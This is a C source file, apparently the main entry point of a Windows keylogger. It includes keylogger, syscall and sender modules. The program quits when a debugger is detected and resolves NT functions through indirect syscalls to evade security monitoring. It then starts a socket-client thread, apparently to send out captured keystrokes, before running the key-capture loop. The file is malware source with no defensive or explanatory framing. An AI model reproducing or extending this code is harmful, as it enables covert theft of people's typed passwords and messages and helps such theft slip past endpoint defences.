#include <stdbool.h>
#include <stdio.h>
#include <windows.h>

#include "keylogger/keylogger.h"
#include "utils/common/utils.h"
#include "utils/init/initializer.h"
#include "syscalls/syscalls.h"
#include "sender/sender.h"
#include "main.h"


char* userId = NULL;
char* result = NULL;


BOOL isDebuggerDetected() {
    return _checkDebugger() != 0;
}

int main() {
    if (isDebuggerDetected()) {
        return 0;
    }

    HMODULE NtdllHandle = NULL;
    PVOID Buffer = NULL;
    HANDLE thread = NULL;
    HANDLE hMutex = NULL;
    HANDLE procH = NULL;
    NTSTATUS Status = 0;

    NtdllHandle = getModuleHandle();
    if (NtdllHandle == NULL) {
        return 0;
    } 

    IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
    IndirectPrelude(NtdllHandle, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall);
    IndirectPrelude(NtdllHandle, "NtCreateMutant", &g_NtCreateMutantSSN, &g_NtCreateMutantSyscall);
    IndirectPrelude(NtdllHandle, "NtReleaseMutant", &g_NtReleaseMutantSSN, &g_NtReleaseMutantSyscall);
    IndirectPrelude(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN, &g_NtWaitForSingleObjectSyscall);

    KeysCombinations* combinations = NULL;
    PressedKeys* pressedKeys = NULL;
    Keys* keys = NULL;
    Set* set = NULL;

    AppContext ctx = {combinations, pressedKeys, keys, set};
    if (!initAppContext(&ctx)) {
        goto CLEANUP;
    }

    if (!initStrings(&result, &userId)) {
        goto CLEANUP;
    }

    Status = NtCreateMutant(&hMutex, SYNCHRONIZE, NULL, FALSE);
    if (STATUS_SUCCESS != Status) {
        goto CLEANUP;
    }

    Status = NtCreateThreadEx(&thread, THREAD_QUERY_INFORMATION, NULL, GetCurrentProcess(), (long int (*)(void *))initSocketClient, (void*)hMutex, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        goto CLEANUP;
    }

    start(ctx.pressedKeys, ctx.keys, ctx.combinations, ctx.set, hMutex);

CLEANUP:
    destroyAppContext(&ctx);

    if (thread) {
        NtClose(thread);
    }

    if (hMutex) {
        NtClose(hMutex);
    }

    if (procH) {
        NtClose(procH);
    }

    if (userId != NULL) {
        free(userId);
        userId = NULL;
    }

    if (result != NULL) {
        free(result);
        result = NULL;
    }

    return 0;
}
